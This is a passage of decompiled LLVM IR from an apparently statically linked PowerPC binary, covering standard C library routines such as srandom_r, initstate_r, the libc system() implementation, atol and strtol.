  store i32 %v1_10010110, i32* %v1_10010104, align 4
  %v0_10010118 = load i32, i32* %r9.global-to-local, align 4
  %v2_10010118 = inttoptr i32 %arg2 to i32*
  store i32 %v0_10010118, i32* %v2_10010118, align 4
  br label %dec_label_pc_10010174

dec_label_pc_10010120:                            ; preds = %entry
  %v2_10010120 = load i32, i32* %arg1, align 4
  %v1_10010124 = add i32 %tmp, 4
  %v2_10010124 = inttoptr i32 %v1_10010124 to i32*
  %v3_10010124 = load i32, i32* %v2_10010124, align 4
  store i32 %v3_10010124, i32* %r9.global-to-local, align 4
  %v1_10010128 = add i32 %tmp, 24
  %v2_10010128 = inttoptr i32 %v1_10010128 to i32*
  %v3_10010128 = load i32, i32* %v2_10010128, align 4
  %v1_1001012c = add i32 %v2_10010120, 4
  store i32 %v1_1001012c, i32* @r8, align 4
  %v1_10010130 = add i32 %v3_10010124, 4
  %v1_10010134 = inttoptr i32 %v3_10010124 to i32*
  %v2_10010134 = load i32, i32* %v1_10010134, align 4
  store i32 %v2_10010134, i32* %r9.global-to-local, align 4
  %v2_10010138 = icmp ult i32 %v1_1001012c, %v3_10010128
  %v1_10010140 = inttoptr i32 %v2_10010120 to i32*
  %v2_10010140 = load i32, i32* %v1_10010140, align 4
  store i32 %v1_10010130, i32* %r10.global-to-local, align 4
  %v2_10010148 = add i32 %v2_10010140, %v2_10010134
  %v1_1001014c = udiv i32 %v2_10010148, 2
  store i32 %v1_1001014c, i32* %r9.global-to-local, align 4
  store i32 %v2_10010148, i32* %v1_10010140, align 4
  %v0_10010154 = load i32, i32* %r9.global-to-local, align 4
  %v2_10010154 = inttoptr i32 %arg2 to i32*
  store i32 %v0_10010154, i32* %v2_10010154, align 4
  br i1 %v2_10010138, label %dec_label_pc_10010164, label %dec_label_pc_1001015c

dec_label_pc_1001015c:                            ; preds = %dec_label_pc_10010120
  %v0_1001015c = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_1001015c, i32* @r8, align 4
  br label %dec_label_pc_1001016c

dec_label_pc_10010164:                            ; preds = %dec_label_pc_10010120
  %v2_1001013c = icmp ult i32 %v1_10010130, %v3_10010128
  br i1 %v2_1001013c, label %dec_label_pc_1001016c, label %dec_label_pc_10010168

dec_label_pc_10010168:                            ; preds = %dec_label_pc_10010164
  %v0_10010168 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_10010168, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1001016c

dec_label_pc_1001016c:                            ; preds = %dec_label_pc_10010164, %dec_label_pc_1001015c, %dec_label_pc_10010168
  %v0_1001016c = load i32, i32* %r10.global-to-local, align 4
  store i32 %v0_1001016c, i32* %v2_10010124, align 4
  %v0_10010170 = load i32, i32* @r8, align 4
  store i32 %v0_10010170, i32* %arg1, align 4
  br label %dec_label_pc_10010174

dec_label_pc_10010174:                            ; preds = %dec_label_pc_10010104, %dec_label_pc_1001016c
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_10010148, { 1, 0 }
  uselistorder i32 %v1_10010130, { 1, 0 }
  uselistorder i32 %v3_10010124, { 1, 0, 2 }
  uselistorder i32 %v1_10010110, { 1, 0 }
  uselistorder i32 %tmp, { 2, 1, 0, 3 }
  uselistorder i32* %r10.global-to-local, { 1, 0, 2 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_10010174, { 1, 0 }
  uselistorder label %dec_label_pc_1001016c, { 2, 0, 1 }
}

define i32 @srandom_r() local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v0_1001017c = load i32, i32* @lr, align 4
  %v0_10010188 = load i32, i32* @r4, align 4
  store i32 %v0_10010188, i32* @r30, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_10010194 = add i32 %v0_10010188, 12
  %v2_10010194 = inttoptr i32 %v1_10010194 to i32*
  %v3_10010194 = load i32, i32* %v2_10010194, align 4
  %v2_10010198 = icmp ugt i32 %v3_10010194, 4
  br i1 %v2_10010198, label %dec_label_pc_10010248, label %dec_label_pc_100101a0

dec_label_pc_100101a0:                            ; preds = %entry
  %v0_100101a0 = load i32, i32* @r3, align 4
  %v3_100101a0 = icmp eq i32 %v0_100101a0, 0
  %v1_100101a4 = add i32 %v0_10010188, 8
  %v2_100101a4 = inttoptr i32 %v1_100101a4 to i32*
  %v3_100101a4 = load i32, i32* %v2_100101a4, align 4
  store i32 %v3_100101a4, i32* %r10.global-to-local, align 4
  br i1 %v3_100101a0, label %dec_label_pc_100101ac, label %dec_label_pc_100101b0

dec_label_pc_100101ac:                            ; preds = %dec_label_pc_100101a0
  store i32 1, i32* @r3, align 4
  br label %dec_label_pc_100101b0

dec_label_pc_100101b0:                            ; preds = %dec_label_pc_100101a0, %dec_label_pc_100101ac
  %v0_100101b4 = phi i32 [ %v0_100101a0, %dec_label_pc_100101a0 ], [ 1, %dec_label_pc_100101ac ]
  %v3_100101b0 = icmp eq i32 %v3_10010194, 0
  %v2_100101b4 = inttoptr i32 %v3_100101a4 to i32*
  store i32 %v0_100101b4, i32* %v2_100101b4, align 4
  br i1 %v3_100101b0, label %dec_label_pc_10010244, label %dec_label_pc_100101bc

dec_label_pc_100101bc:                            ; preds = %dec_label_pc_100101b0
  %v0_100101bc = load i32, i32* @r30, align 4
  %v1_100101bc = add i32 %v0_100101bc, 16
  %v2_100101bc = inttoptr i32 %v1_100101bc to i32*
  %v3_100101bc = load i32, i32* %v2_100101bc, align 4
  store i32 %v3_100101bc, i32* %r11.global-to-local, align 4
  store i32 127773, i32* @r8, align 4
  store i32 2147483647, i32* %r7.global-to-local, align 4
  %v0_100101d4 = load i32, i32* %r10.global-to-local, align 4
  store i32 %v3_100101bc, i32* %ctr.global-to-local, align 4
  %tmp18 = icmp sgt i32 %v3_100101bc, 0
  br i1 %tmp18, label %dec_label_pc_10010210.preheader, label %dec_label_pc_10010210.preheader.thread

dec_label_pc_10010210.preheader.thread:           ; preds = %dec_label_pc_100101bc
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 0, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_10010214

dec_label_pc_10010210.preheader:                  ; preds = %dec_label_pc_100101bc
  %v1_100102102 = add i32 %v3_100101bc, -1
  store i32 %v1_100102102, i32* %ctr.global-to-local, align 4
  %v2_100102103 = icmp eq i32 %v1_100102102, 0
  br i1 %v2_100102103, label %dec_label_pc_10010214, label %dec_label_pc_100101ec

dec_label_pc_100101ec:                            ; preds = %dec_label_pc_10010210.preheader, %dec_label_pc_1001020c.dec_label_pc_100101ec_crit_edge
  %v1_1001020c = phi i32 [ %v2_1001020c, %dec_label_pc_1001020c.dec_label_pc_100101ec_crit_edge ], [ %v0_100101d4, %dec_label_pc_10010210.preheader ]
  %v1_100101ec = phi i32 [ %v1_100101ec.pre, %dec_label_pc_1001020c.dec_label_pc_100101ec_crit_edge ], [ 127773, %dec_label_pc_10010210.preheader ]
  %v0_100101ec = load i32, i32* @r3, align 4
  %v2_100101ec = sdiv i32 %v0_100101ec, %v1_100101ec
  %v2_100101f0 = mul i32 %v2_100101ec, %v1_100101ec
  %v2_100101f4 = sub i32 %v0_100101ec, %v2_100101f0
  %v1_100101f8 = mul i32 %v2_100101ec, 2836
  store i32 %v1_100101f8, i32* %r0.global-to-local, align 4
  %v1_100101fc = mul i32 %v2_100101f4, 16807
  %v2_10010200 = sub i32 %v1_100101fc, %v1_100101f8
  store i32 %v2_10010200, i32* @r3, align 4
  %tmp19 = icmp sgt i32 %v2_10010200, -1
  br i1 %tmp19, label %dec_label_pc_1001020c, label %dec_label_pc_10010208

dec_label_pc_10010208:                            ; preds = %dec_label_pc_100101ec
  %v1_10010208 = load i32, i32* %r7.global-to-local, align 4
  %v2_10010208 = add i32 %v1_10010208, %v2_10010200
  store i32 %v2_10010208, i32* @r3, align 4
  br label %dec_label_pc_1001020c

dec_label_pc_1001020c:                            ; preds = %dec_label_pc_100101ec, %dec_label_pc_10010208
  %v0_1001020c = phi i32 [ %v2_10010200, %dec_label_pc_100101ec ], [ %v2_10010208, %dec_label_pc_10010208 ]
  %v2_1001020c = add i32 %v1_1001020c, 4
  %v3_1001020c = inttoptr i32 %v2_1001020c to i32*
  store i32 %v0_1001020c, i32* %v3_1001020c, align 4
  %v0_10010210 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10010210 = add i32 %v0_10010210, -1
  store i32 %v1_10010210, i32* %ctr.global-to-local, align 4
  %v2_10010210 = icmp eq i32 %v1_10010210, 0
  br i1 %v2_10010210, label %dec_label_pc_10010210.dec_label_pc_10010214_crit_edge, label %dec_label_pc_1001020c.dec_label_pc_100101ec_crit_edge

dec_label_pc_1001020c.dec_label_pc_100101ec_crit_edge: ; preds = %dec_label_pc_1001020c
  %v1_100101ec.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_100101ec

dec_label_pc_10010210.dec_label_pc_10010214_crit_edge: ; preds = %dec_label_pc_1001020c
  %v0_10010214.pre = load i32, i32* @r30, align 4
  %v0_10010218.pre = load i32, i32* %r11.global-to-local, align 4
  %v0_1001021c.pre = load i32, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_10010214

dec_label_pc_10010214:                            ; preds = %dec_label_pc_10010210.preheader.thread, %dec_label_pc_10010210.dec_label_pc_10010214_crit_edge, %dec_label_pc_10010210.preheader
  %v0_1001021c = phi i32 [ %v0_1001021c.pre, %dec_label_pc_10010210.dec_label_pc_10010214_crit_edge ], [ %v0_100101d4, %dec_label_pc_10010210.preheader ], [ %v0_100101d4, %dec_label_pc_10010210.preheader.thread ]
  %v0_10010218 = phi i32 [ %v0_10010218.pre, %dec_label_pc_10010210.dec_label_pc_10010214_crit_edge ], [ %v3_100101bc, %dec_label_pc_10010210.preheader ], [ %v3_100101bc, %dec_label_pc_10010210.preheader.thread ]
  %v1_1001021c = phi i32 [ %v0_10010214.pre, %dec_label_pc_10010210.dec_label_pc_10010214_crit_edge ], [ %v0_100101bc, %dec_label_pc_10010210.preheader ], [ %v0_100101bc, %dec_label_pc_10010210.preheader.thread ]
  %v1_10010214 = add i32 %v1_1001021c, 20
  %v2_10010214 = inttoptr i32 %v1_10010214 to i32*
  %v3_10010214 = load i32, i32* %v2_10010214, align 4
  store i32 %v3_10010214, i32* %r0.global-to-local, align 4
  %v1_10010218 = mul i32 %v0_10010218, 10
  store i32 %v1_10010218, i32* %r31.global-to-local, align 4
  %v2_1001021c = add i32 %v1_1001021c, 4
  %v3_1001021c = inttoptr i32 %v2_1001021c to i32*
  store i32 %v0_1001021c, i32* %v3_1001021c, align 4
  %v0_10010220 = load i32, i32* %r0.global-to-local, align 4
  %v1_10010220 = mul i32 %v0_10010220, 4
  %v0_10010224 = load i32, i32* %r10.global-to-local, align 4
  %v2_10010224 = add i32 %v0_10010224, %v1_10010220
  store i32 %v2_10010224, i32* %r0.global-to-local, align 4
  %v1_10010228 = load i32, i32* @r30, align 4
  %v2_10010228 = inttoptr i32 %v1_10010228 to i32*
  store i32 %v2_10010224, i32* %v2_10010228, align 4
  %v2_1001023c = ptrtoint i32* %stack_var_-24 to i32
  %v0_1001023421 = load i32, i32* %r31.global-to-local, align 4
  %v1_1001023422 = add i32 %v0_1001023421, -1
  store i32 %v1_1001023422, i32* @r31, align 4
  %tmp2025 = icmp sgt i32 %v1_1001023422, -1
  br i1 %tmp2025, label %dec_label_pc_10010230, label %dec_label_pc_10010244

dec_label_pc_10010230:                            ; preds = %dec_label_pc_10010214, %dec_label_pc_10010230
  %v0_1001023826 = load i32, i32* @r30, align 4
  %v2_10010230 = inttoptr i32 %v0_1001023826 to i32*
  %v3_10010230 = call i32 @__GI_random_r(i32* %v2_10010230, i32 %v2_1001023c)
  %v0_10010234 = load i32, i32* @r31, align 4
  %v1_10010234 = add i32 %v0_10010234, -1
  store i32 %v1_10010234, i32* @r31, align 4
  %tmp20 = icmp sgt i32 %v1_10010234, -1
  br i1 %tmp20, label %dec_label_pc_10010230, label %dec_label_pc_10010244

dec_label_pc_10010244:                            ; preds = %dec_label_pc_10010214, %dec_label_pc_10010230, %dec_label_pc_100101b0
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10010248

dec_label_pc_10010248:                            ; preds = %entry, %dec_label_pc_10010244
  %v0_10010248 = phi i32 [ -1, %entry ], [ 0, %dec_label_pc_10010244 ]
  store i32 %v0_1001017c, i32* %r0.global-to-local, align 4
  ret i32 %v0_10010248

; uselistorder directives
  uselistorder i32 %v1_10010210, { 1, 0 }
  uselistorder i32 %v2_1001020c, { 1, 0 }
  uselistorder i32 %v2_10010200, { 1, 0, 2, 3 }
  uselistorder i32 %v2_100101ec, { 1, 0 }
  uselistorder i32 %v0_100101d4, { 1, 2, 0 }
  uselistorder i32 %v3_100101bc, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32* %r10.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %ctr.global-to-local, { 2, 1, 0, 4, 3 }
  uselistorder label %dec_label_pc_10010248, { 1, 0 }
  uselistorder label %dec_label_pc_10010244, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10010230, { 1, 0 }
  uselistorder label %dec_label_pc_10010214, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1001020c, { 1, 0 }
  uselistorder label %dec_label_pc_100101ec, { 1, 0 }
  uselistorder label %dec_label_pc_100101b0, { 1, 0 }
}

define i32 @__GI_initstate_r(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %v2_10010260 = icmp ugt i32 %arg2, 127
  %v0_10010268 = load i32, i32* @lr, align 4
  store i32 %v0_10010268, i32* %r0.global-to-local, align 4
  store i32 268500992, i32* %r9.global-to-local, align 4
  %v1_10010274 = sub i32 255, %arg2
  %v2_10010274 = sub i32 -1, %arg2
  %not.v5_10010274 = icmp ugt i32 %v1_10010274, %v2_10010274
  %v6_10010278 = sext i1 %not.v5_10010274 to i32
  store i32 %tmp, i32* %r27.global-to-local, align 4
  %v1_10010280 = add i32 %tmp, 4
  store i32 %v1_10010280, i32* %r29.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10017774.649 to i32), i32* %r11.global-to-local, align 4
  store i32 %arg3, i32* %r30.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  %v1_10010298 = sub nsw i32 3, %v6_10010278
  store i32 %v1_10010298, i32* @r31, align 4
  br i1 %v2_10010260, label %dec_label_pc_100102c0, label %dec_label_pc_100102a0

dec_label_pc_100102a0:                            ; preds = %entry
  %v2_1001028c = icmp ugt i32 %arg2, 31
  %v1_100102a0 = sub i32 63, %arg2
  %not.v5_100102a0 = icmp ugt i32 %v1_100102a0, %v2_10010274
  %v6_100102a4 = sext i1 %not.v5_100102a0 to i32
  %v1_100102ac = sub nsw i32 1, %v6_100102a4
  store i32 %v1_100102ac, i32* @r31, align 4
  br i1 %v2_1001028c, label %dec_label_pc_100102c0, label %dec_label_pc_100102b4

dec_label_pc_100102b4:                            ; preds = %dec_label_pc_100102a0
  store i32 22, i32* %r28.global-to-local, align 4
  store i32 0, i32* @r31, align 4
  %tmp5 = icmp ult i32 %arg2, 8
  br i1 %tmp5, label %dec_label_pc_10010320, label %dec_label_pc_100102c0

dec_label_pc_100102c0:                            ; preds = %dec_label_pc_100102b4, %dec_label_pc_100102a0, %entry
  %v0_100102c0 = phi i32 [ 0, %dec_label_pc_100102b4 ], [ %v1_100102ac, %dec_label_pc_100102a0 ], [ %v1_10010298, %entry ]
  %v1_100102c0 = mul nsw i32 %v0_100102c0, 4
  store i32 %v1_100102c0, i32* %r0.global-to-local, align 4
  %v2_100102c4 = add i32 %arg3, 12
  %v3_100102c4 = inttoptr i32 %v2_100102c4 to i32*
  store i32 %v0_100102c0, i32* %v3_100102c4, align 4
  %v0_100102c8 = load i32, i32* %r0.global-to-local, align 4
  %v1_100102c8 = load i32, i32* %r11.global-to-local, align 4
  %v2_100102c8 = add i32 %v1_100102c8, %v0_100102c8
  store i32 %v2_100102c8, i32* %r9.global-to-local, align 4
  %v3_100102cc = inttoptr i32 %v2_100102c8 to i32*
  %v4_100102cc = load i32, i32* %v3_100102cc, align 4
  store i32 %v4_100102cc, i32* %r0.global-to-local, align 4
  %v1_100102d0 = add i32 %v2_100102c8, 20
  %v2_100102d0 = inttoptr i32 %v1_100102d0 to i32*
  %v3_100102d0 = load i32, i32* %v2_100102d0, align 4
  store i32 %v3_100102d0, i32* %r9.global-to-local, align 4
  %v1_100102d4 = load i32, i32* %r30.global-to-local, align 4
  %v2_100102d4 = add i32 %v1_100102d4, 20
  %v3_100102d4 = inttoptr i32 %v2_100102d4 to i32*
  store i32 %v4_100102cc, i32* %v3_100102d4, align 4
  %v0_100102d8 = load i32, i32* %r9.global-to-local, align 4
  %v1_100102d8 = mul i32 %v0_100102d8, 4
  store i32 %v1_100102d8, i32* %r0.global-to-local, align 4
  %v0_100102dc = load i32, i32* %r29.global-to-local, align 4
  %v1_100102dc = load i32, i32* %r30.global-to-local, align 4
  %v2_100102dc = add i32 %v1_100102dc, 8
  %v3_100102dc = inttoptr i32 %v2_100102dc to i32*
  store i32 %v0_100102dc, i32* %v3_100102dc, align 4
  %v0_100102e0 = load i32, i32* %r29.global-to-local, align 4
  %v1_100102e0 = load i32, i32* %r0.global-to-local, align 4
  %v2_100102e0 = add i32 %v1_100102e0, %v0_100102e0
  store i32 %v2_100102e0, i32* %r0.global-to-local, align 4
  %v0_100102e4 = load i32, i32* %r9.global-to-local, align 4
  %v1_100102e4 = load i32, i32* %r30.global-to-local, align 4
  %v2_100102e4 = add i32 %v1_100102e4, 16
  %v3_100102e4 = inttoptr i32 %v2_100102e4 to i32*
  store i32 %v0_100102e4, i32* %v3_100102e4, align 4
  %v0_100102e8 = load i32, i32* %r0.global-to-local, align 4
  %v1_100102e8 = load i32, i32* %r30.global-to-local, align 4
  %v2_100102e8 = add i32 %v1_100102e8, 24
  %v3_100102e8 = inttoptr i32 %v2_100102e8 to i32*
  store i32 %v0_100102e8, i32* %v3_100102e8, align 4
  store i32 268501744, i32* @lr, align 4
  %v0_100102ec = call i32 @srandom_r()
  %v0_100102f0 = load i32, i32* @r31, align 4
  %v3_100102f0 = icmp eq i32 %v0_100102f0, 0
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_100102fc = load i32, i32* %r27.global-to-local, align 4
  %v2_100102fc = inttoptr i32 %v1_100102fc to i32*
  store i32 0, i32* %v2_100102fc, align 4
  br i1 %v3_100102f0, label %dec_label_pc_10010334, label %dec_label_pc_10010304

dec_label_pc_10010304:                            ; preds = %dec_label_pc_100102c0
  %v0_10010304 = load i32, i32* @r30, align 4
  %v1_10010304 = add i32 %v0_10010304, 4
  %v2_10010304 = inttoptr i32 %v1_10010304 to i32*
  %v3_10010304 = load i32, i32* %v2_10010304, align 4
  %v0_10010308 = load i32, i32* %r29.global-to-local, align 4
  %v2_10010308 = sub i32 %v3_10010304, %v0_10010308
  %v4_1001030c = sdiv i32 %v2_10010308, 4
  %v1_10010310 = mul i32 %v4_1001030c, 5
  %v1_10010314 = load i32, i32* @r31, align 4
  %v2_10010314 = add i32 %v1_10010310, %v1_10010314
  store i32 %v2_10010314, i32* %r0.global-to-local, align 4
  %v1_10010318 = load i32, i32* %r27.global-to-local, align 4
  %v2_10010318 = inttoptr i32 %v1_10010318 to i32*
  store i32 %v2_10010314, i32* %v2_10010318, align 4
  br label %dec_label_pc_10010334

dec_label_pc_10010320:                            ; preds = %dec_label_pc_100102b4
  %v0_10010320 = call i32 @__errno_location()
  store i32 %v0_10010320, i32* %r3.global-to-local, align 4
  %v0_10010324 = load i32, i32* %r28.global-to-local, align 4
  %v2_10010324 = inttoptr i32 %v0_10010320 to i32*
  store i32 %v0_10010324, i32* %v2_10010324, align 4
  %v0_10010328 = call i32 @__errno_location()
  %v0_1001032c = load i32, i32* %r28.global-to-local, align 4
  %v2_1001032c = inttoptr i32 %v0_10010328 to i32*
  store i32 %v0_1001032c, i32* %v2_1001032c, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10010334

dec_label_pc_10010334:                            ; preds = %dec_label_pc_100102c0, %dec_label_pc_10010304, %dec_label_pc_10010320
  store i32 %v0_10010268, i32* %r0.global-to-local, align 4
  %v0_10010344 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_10010344

; uselistorder directives
  uselistorder i32 %v2_100102c8, { 1, 0, 2 }
  uselistorder i32 %v0_100102c0, { 1, 0 }
  uselistorder i32 %v2_10010274, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32 ()* @srandom_r, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_10017774.649 to i32), { 2, 1, 0, 3 }
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder i32 %arg2, { 1, 4, 2, 0, 5, 3 }
  uselistorder label %dec_label_pc_10010334, { 2, 1, 0 }
}

define i32 @__libc_system(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v0_10010350 = load i32, i32* @r31, align 4
  %v3_10010358 = icmp eq i32 %arg1, 0
  store i1 false, i1* @cr0_so, align 1
  br i1 %v3_10010358, label %dec_label_pc_10010488, label %dec_label_pc_10010368

dec_label_pc_10010368:                            ; preds = %entry
  store i32 268501876, i32* @lr, align 4
  %v2_10010370 = call i32 @__bsd_signal(i32 3, i32 1)
  store i32 268501892, i32* @lr, align 4
  %v2_10010380 = call i32 @__bsd_signal(i32 2, i32 1)
  store i32 268501908, i32* @lr, align 4
  %v2_10010390 = call i32 @__bsd_signal(i32 17, i32 0)
  store i32 %v2_10010390, i32* @r3, align 4
  store i32 268501916, i32* @lr, align 4
  %v0_10010398 = call i32 @__vfork()
  store i32 %v0_10010398, i32* @r31, align 4
  %tmp10 = icmp sgt i32 %v0_10010398, -1
  br i1 %tmp10, label %dec_label_pc_100103d0, label %dec_label_pc_100103a4

dec_label_pc_100103a4:                            ; preds = %dec_label_pc_10010368
  store i32 268501936, i32* @lr, align 4
  %v2_100103ac = call i32 @__bsd_signal(i32 3, i32 %v2_10010370)
  store i32 268501948, i32* @lr, align 4
  %v2_100103b8 = call i32 @__bsd_signal(i32 2, i32 %v2_10010380)
  store i32 268501960, i32* @lr, align 4
  %v2_100103c4 = call i32 @__bsd_signal(i32 17, i32 %v2_10010390)
  br label %dec_label_pc_10010488

dec_label_pc_100103d0:                            ; preds = %dec_label_pc_10010368
  %v3_1001039c = icmp eq i32 %v0_10010398, 0
  br i1 %v3_1001039c, label %dec_label_pc_100103d4, label %dec_label_pc_10010428

dec_label_pc_100103d4:                            ; preds = %dec_label_pc_100103d0
  store i32 268501984, i32* @lr, align 4
  %v2_100103dc = call i32 @__bsd_signal(i32 3, i32 0)
  store i32 268501996, i32* @lr, align 4
  %v2_100103e8 = call i32 @__bsd_signal(i32 2, i32 0)
  store i32 268502008, i32* @lr, align 4
  %v2_100103f4 = call i32 @__bsd_signal(i32 17, i32 0)
  %v8_1001041c = call i32 @execl(i32 ptrtoint ([8 x i8]* @global_var_1001779c.651 to i32), i32 ptrtoint ([3 x i8]* @global_var_100177a4.652 to i32), i32 ptrtoint ([3 x i8]* @global_var_100177a8.653 to i32), i32 %arg1, i32 0)
  %v1_10010424 = call i32 @__GI__exit(i32 127)
  br label %dec_label_pc_10010428

dec_label_pc_10010428:                            ; preds = %dec_label_pc_100103d0, %dec_label_pc_100103d4
  store i32 268502068, i32* @lr, align 4
  %v2_10010430 = call i32 @__bsd_signal(i32 3, i32 1)
  store i32 268502080, i32* @lr, align 4
  %v2_1001043c = call i32 @__bsd_signal(i32 2, i32 1)
  %v0_10010440 = load i32, i32* @r31, align 4
  store i32 268502100, i32* @lr, align 4
  %v4_10010450 = call i32 @wait4(i32 %v0_10010440)
  %v3_10010454 = icmp eq i32 %v4_10010450, -1
  br i1 %v3_10010454, label %dec_label_pc_1001045c, label %dec_label_pc_10010460

dec_label_pc_1001045c:                            ; preds = %dec_label_pc_10010428
  store i32 -1, i32* %stack_var_-40, align 4
  br label %dec_label_pc_10010460

dec_label_pc_10010460:                            ; preds = %dec_label_pc_10010428, %dec_label_pc_1001045c
  store i32 268502124, i32* @lr, align 4
  %v2_10010468 = call i32 @__bsd_signal(i32 3, i32 %v2_10010370)
  store i32 268502136, i32* @lr, align 4
  %v2_10010474 = call i32 @__bsd_signal(i32 2, i32 %v2_10010380)
  store i32 268502148, i32* @lr, align 4
  %v2_10010480 = call i32 @__bsd_signal(i32 17, i32 %v2_10010390)
  %v3_10010484 = load i32, i32* %stack_var_-40, align 4
  br label %dec_label_pc_10010488

dec_label_pc_10010488:                            ; preds = %entry, %dec_label_pc_100103a4, %dec_label_pc_10010460
  %v0_10010498 = phi i32 [ 1, %entry ], [ -1, %dec_label_pc_100103a4 ], [ %v3_10010484, %dec_label_pc_10010460 ]
  store i32 %v0_10010350, i32* @r31, align 4
  ret i32 %v0_10010498

; uselistorder directives
  uselistorder i32 %v0_10010398, { 1, 0, 2 }
  uselistorder i32 %v2_10010390, { 1, 0, 2 }
  uselistorder i32 %v2_10010380, { 1, 0 }
  uselistorder i32 %v2_10010370, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @execl, { 1, 0 }
  uselistorder i32 ()* @__vfork, { 1, 0 }
  uselistorder i32 (i32, i32)* @__bsd_signal, { 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0, 14 }
  uselistorder label %dec_label_pc_10010488, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10010460, { 1, 0 }
  uselistorder label %dec_label_pc_10010428, { 1, 0 }
}

define i32 @atol(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 0, i32* @r4, align 4
  store i32 10, i32* @r5, align 4
  %v2_100104a4 = call i32 @strtol(i32 0, i32 10)
  ret i32 %v2_100104a4
}

define i32 @strtol(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 1, i32* @r6, align 4
  %v2_100104ac = call i32 @_stdlib_strto_l(i8* inttoptr (i32 1 to i8*))
  ret i32 %v2_100104ac
}

define i32 @_stdlib_strto_l(i8* %arg1) local_unnamed_addr {
entry:
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_100104c0 = load i32, i32* @r4, align 4
  store i32 %v0_100104c0, i32* @r25, align 4
  %v0_100104c8 = load i32, i32* @r5, align 4
  store i32 %v0_100104c8, i32* %r30.global-to-local, align 4
  %v0_100104cc = load i32, i32* @r6, align 4
  store i32 %v0_100104cc, i32* @r26, align 4
  store i32 %tmp, i32* %r31.global-to-local, align 4
  %v3_100104d4 = load i32, i32* @global_var_10028578, align 4
  br label %dec_label_pc_100104e0

dec_label_pc_100104dc:                            ; preds = %dec_label_pc_100104e0
  %v1_100104dc = add i32 %v0_10010514, 1
  store i32 %v1_100104dc, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_100104e0

dec_label_pc_100104e0:                            ; preds = %entry, %dec_label_pc_100104dc
  %v0_10010514 = phi i32 [ %tmp, %entry ], [ %v1_100104dc, %dec_label_pc_100104dc ]
  %v1_100104e0 = inttoptr i32 %v0_10010514 to i8*
  %v2_100104e0 = load i8, i8* %v1_100104e0, align 1
  %v3_100104e0 = zext i8 %v2_100104e0 to i32
  %v1_100104e4 = mul nuw nsw i32 %v3_100104e0, 2
  %v2_100104e8 = add i32 %v1_100104e4, %v3_100104d4
  %v3_100104e8 = inttoptr i32 %v2_100104e8 to i16*
  %v4_100104e8 = load i16, i16* %v3_100104e8, align 2
  %v1_100104ec = and i16 %v4_100104e8, 32
  %v3_100104ec = icmp eq i16 %v1_100104ec, 0
  br i1 %v3_100104ec, label %dec_label_pc_100104f4, label %dec_label_pc_100104dc

dec_label_pc_100104f4:                            ; preds = %dec_label_pc_100104e0
  %v3_100104f4 = icmp eq i8 %v2_100104e0, 43
  br i1 %v3_100104f4, label %dec_label_pc_10010514, label %dec_label_pc_100104fc

dec_label_pc_100104fc:                            ; preds = %dec_label_pc_100104f4
  %v3_100104fc = icmp eq i8 %v2_100104e0, 45
  store i32 0, i32* @r28, align 4
  br i1 %v3_100104fc, label %dec_label_pc_10010514, label %dec_label_pc_10010518

dec_label_pc_10010514:                            ; preds = %dec_label_pc_100104f4, %dec_label_pc_100104fc
  %storemerge = phi i32 [ 1, %dec_label_pc_100104fc ], [ 0, %dec_label_pc_100104f4 ]
  store i32 %storemerge, i32* @r28, align 4
  %v1_10010514 = add i32 %v0_10010514, 1
  store i32 %v1_10010514, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10010518

dec_label_pc_10010518:                            ; preds = %dec_label_pc_100104fc, %dec_label_pc_10010514
  %v1_10010518 = call i32 @__asm_rlwinm.(i32 %v0_100104c8, i32 0, i32 28, i32 26)
  %v4_10010518 = icmp eq i32 %v1_10010518, 0
